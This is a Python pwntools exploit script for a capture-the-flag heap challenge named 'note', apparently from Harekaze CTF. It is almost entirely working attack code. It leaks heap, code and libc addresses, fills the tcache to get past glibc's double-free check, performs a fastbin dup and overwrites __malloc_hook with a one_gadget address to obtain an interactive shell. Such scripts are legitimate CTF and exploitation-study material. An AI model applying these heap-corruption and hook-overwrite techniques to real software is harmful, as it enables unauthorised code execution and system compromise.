from pwn import *
from pwn_debug.pwn_debug import *
context.log_level = 'debug'

TARGET = "note"
elf = ELF(TARGET)
HOST = "problem.harekaze.com"
PORT = 20003

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

pdbg = pwn_debug(TARGET)
# pdbg.local("./libc.so.6")
pdbg.local("/lib/x86_64-linux-gnu/libc-2.29.so")

r = pdbg.run("local")
# r = remote(HOST, PORT)
# pdbg.bp([0x16c3, 0x156b, 0x13e5])



def create(title):
    r.sendline('1')
    r.recvuntil('Title:')
    r.send(title)
    r.recvuntil('Choice:')

def write(title, size, content):
    r.sendline('2')
    r.recvuntil('content:')
    r.send(title)
    r.recvuntil('content:')
    r.sendline(str(size))
    r.recvuntil('Content:')
    r.send(content)
    r.recvuntil('Choice:')

def show(title):
    r.sendline('3')
    r.recvuntil('content:')
    r.send(title)
    text = r.recvuntil('Choice:')
    return text

def delete(title):
    r.sendline('4')
    r.recvuntil('delete:')
    r.send(title)
    text = r.recvuntil('Choice:')


r.recvuntil('Choice:')

create("A"*0x10)
create("X"*0x10)
create("Y"*0x10)
create("B"*0x10)
create("C"*0x10) # point content addr
write("C"*0x10, 0x18, "c"*0x10+'\n')
create("D"*0x10)
delete("C"*0x10)
delete("D"*0x10) 
create("F"*0x10)
write("F"*0x10, 0x28, "f"*0x20+'\n') # overwrite with \x00 
delete("F"*0x10) 
create("G"*0x10)
create("H"*0x10) # now point fd addr

heap = u64(show("H"*0x10)[1:7].ljust(8, '\x00'))
heap_base = heap - 0x2c0
dbg("heap")
dbg("heap_base")

delete("A"*0x10)
delete("X"*0x10)
delete("Y"*0x10) # these deletes makes fd addr -> text section addr

code = u64(show("H"*0x10)[1:7].ljust(8, '\x00'))
target = code - 0x108
dbg("code")
dbg("target")

create("I"*0x10)
write("I"*0x10, 0x28, "i"*0x20+p64(target)) # overwrite content addr with libc addr
delete("I"*0x10)

create("J"*0x10)
create("K"*0x10) # now point libc addr
libc_free = u64(show("K"*0x10)[1:7].ljust(8, '\x00'))
base = libc_free - 0x991d0
gadget = [0xe237f, 0xe2383, 0xe2386, 0x106ef8]
malloc_hook = base + 0x1e4c30 # __malloc_hook(0x1e4c30)
free_hook = base + 0x1e75a8 # __free_hook(0x1e75a8)

dbg("libc_free")
dbg("base")
dbg("malloc_hook")
dbg("free_hook")

# create dangling pointer at heap_base + 0x400
create("L"*0x10)
create("M"*0x10) 
create("N"*0x10) # point 0x400 chunk addr
write("N"*0x10, 0x40, p64(malloc_hook)+'\n') 

create("O"*0x10) # will point 0x400 
write("O"*0x10, 0x40, "o"*0x10+'\n') 
create("P"*0x10)
delete("O"*0x10)  
delete("P"*0x10)  
create("Q"*0x10)
write("Q"*0x10, 0x28, "q"*0x20+'\n') # change to 0x400
delete("Q"*0x10)
create("R"*0x10)
create("S"*0x10) # now point to 0x400 addr

create("T"*0x10) # dummy chunk for dup
write("T"*0x10, 0x40, "t"*0x10+'\n')

# fill tcache for avoiding double free detection
for i in range(9):
    create(str(i)*0x10)
    write(str(i)*0x10, 0x40, "hoge\n")

for i in range(9):
    delete(str(i)*0x10)

# trigger fastbin dup 
delete("N"*0x10) 
delete("T"*0x10) 
delete("S"*0x10) 

# fill tcache to use dup 
# we also need filling some useless chunks
create("a"*0x10)
create("b"*0x10)
create("c"*0x10) 
for i in range(9):
    create(str(i)*2+'\n')
for i in range(7):
    create(str(i)*0x10)
    write(str(i)*0x10, 0x40, "hoge\n")

# overwrite malloc_hook
create("U"*0x10)
write("U"*0x10, 0x40, p64(malloc_hook)+'\n')
create("V"*0x10)
write("V"*0x10, 0x40, "dummy desu"+'\n')
create("W"*0x10)
write("W"*0x10, 0x40, "dummy desuzo"+'\n')
create("Z"*0x10)
write("Z"*0x10, 0x40, p64(base+gadget[3])+'\n')

r.sendline("1")

r.interactive()
